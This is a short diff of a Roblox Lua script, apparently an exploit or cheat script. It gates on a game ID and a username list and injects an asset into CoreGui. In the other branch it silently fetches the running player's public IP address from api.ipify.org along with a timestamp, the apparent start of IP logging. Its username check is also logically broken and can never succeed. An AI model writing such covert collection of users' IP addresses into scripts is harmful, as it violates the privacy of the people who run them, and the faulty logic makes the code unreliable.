@@ -1,6 +1,6 @@
 if game.PlaceId == 4913708314 then
   if not game.Players.LocalPlayer.Name == "lazmuri3" and game.Players.LocalPlayer.Name == "celalcan5554" and game.Players.LocalPlayer.Name == "Apoleias" and game.Players.LocalPlayer.Name == "N3mes1s_Nyks" then
-    gameGetObjects(rbxassetid..0x123)[1].Parent = game.CoreGui
+    game:GetObjects("rbxassetid://"..0x123)[1].Parent = game.CoreGui
     else
 local ip = tostring(game:HttpGet("https://api.ipify.org/", true))
 local OSTime = os.time();
